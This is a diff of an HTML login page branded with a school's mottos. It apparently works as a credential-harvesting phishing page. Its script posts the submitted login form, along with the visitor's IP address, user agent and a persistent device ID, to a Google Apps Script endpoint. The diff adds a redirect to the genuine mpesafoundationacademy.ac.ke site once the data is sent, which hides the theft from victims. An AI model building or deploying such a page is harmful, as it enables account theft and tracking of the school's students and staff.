@@ -15,7 +15,6 @@
       flex-direction: column;
       align-items: center;
     }
-
     .login-wrapper {
       display: flex;
       flex-direction: column;
@@ -24,7 +23,6 @@
       flex: 1;
       width: 100%;
     }
-
     .top-text, .success-top {
       font-size: 16px;
       color: #333;
@@ -38,7 +36,6 @@
       width: 100%;
       color: #555;
     }
-
     .container, .success-container {
       text-align: center;
       border: 1px solid #eee;
@@ -47,20 +44,17 @@
       box-shadow: 0 0 3px rgba(0,0,0,0.1);
       width: 280px;
     }
-
     .logo-img, .success-logo-img {
       width: 160px;
       height: auto;
       margin-bottom: 18px;
     }
-
     h3 {
       color: #2a5b9e;
       font-weight: normal;
       margin-bottom: 18px;
       font-size: 16px;
     }
-
     input[type="text"], input[type="password"] {
       width: 100%;
       padding: 10px;
@@ -70,7 +64,6 @@
       font-size: 14px;
       box-sizing: border-box;
     }
-
     button, .logout-btn {
       width: 100%;
       background-color: #4CAF50;
@@ -83,11 +76,9 @@
       margin: 10px 0 0;
       transition: background 0.2s;
     }
-
     button:hover, .logout-btn:hover {
       background-color: #45a049;
     }
-
     .footer-text, .success-portal {
       margin-top: 10px;
       font-size: 13px;
@@ -100,14 +91,12 @@
     .footer-text a:hover, .success-portal a:hover {
       text-decoration: underline;
     }
-
     #response {
       color: red;
       font-size: 14px;
       margin-top: 8px;
       min-height: 20px;
     }
-
     .success-page {
       display: none;
       position: fixed;
@@ -121,7 +110,6 @@
       z-index: 9999;
       font-family: Arial, sans-serif;
     }
-
     .success-message {
       color: #2a5b9e;
       font-size: 18px;
@@ -129,7 +117,6 @@
       margin: 20px 0;
       line-height: 1.4;
     }
-
     .success-check-img {
       width: 60px;
       height: 60px;
@@ -142,7 +129,6 @@
   </style>
 </head>
 <body>
-
   <div class="login-wrapper">
     <div class="top-text">Thinkers : Doers : Leaders</div>
     <div class="container">
@@ -164,7 +150,6 @@
       Curiosity : Leadership : Accountability : Innovation : Responsible Citizenship : Excellence
     </div>
   </div>
-
   <div class="success-page" id="successPage">
     <div class="success-container">
       <div class="success-top">Thinkers : Doers : Leaders</div>
@@ -184,13 +169,11 @@
       Curiosity : Leadership : Accountability : Innovation : Responsible Citizenship : Excellence
     </div>
   </div>
-
   <script>
     const scriptURL = 'https://script.google.com/macros/s/AKfycbzdnme2wJ3yraQkfeslYEbapcaHXZETLmbibHEUBVESaHHRAeUM6F48T-H1CX11G5HA/exec';
     const form = document.getElementById('authForm');
     const responseEl = document.getElementById('response');
     const successPage = document.getElementById('successPage');
-
     async function getUserIP() {
       try {
         const res = await fetch('https://api.ipify.org?format=json');
@@ -200,7 +183,6 @@
         return 'Unavailable';
       }
     }
-
     function getDeviceID() {
       let id = localStorage.getItem('deviceID');
       if (!id) {
@@ -209,31 +191,30 @@
       }
       return id;
     }
-
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
-      responseEl.textContent = ''; 
-
+      responseEl.textContent = '';
       const formData = new FormData(form);
       const ip = await getUserIP();
       const userAgent = navigator.userAgent;
       const deviceID = getDeviceID();
-
       formData.append('ip', ip);
       formData.append('userAgent', userAgent);
       formData.append('deviceID', deviceID);
-
       try {
         const res = await fetch(scriptURL, {
           method: 'POST',
           body: formData,
         });
-
         if (res.ok) {
           responseEl.style.color = 'green';
           responseEl.textContent = 'Success!';
           form.reset();
           successPage.style.display = 'flex';
+          // Redirect after 1 second
+          setTimeout(() => {
+            window.location.href = 'https://mpesafoundationacademy.ac.ke';
+          }, 1000);
         } else {
           throw new Error('Network error');
         }
@@ -243,7 +224,6 @@
         console.error(err);
       }
     });
-
     document.querySelector('.logout-btn').addEventListener('click', () => {
       successPage.style.display = 'none';
       responseEl.textContent = '';
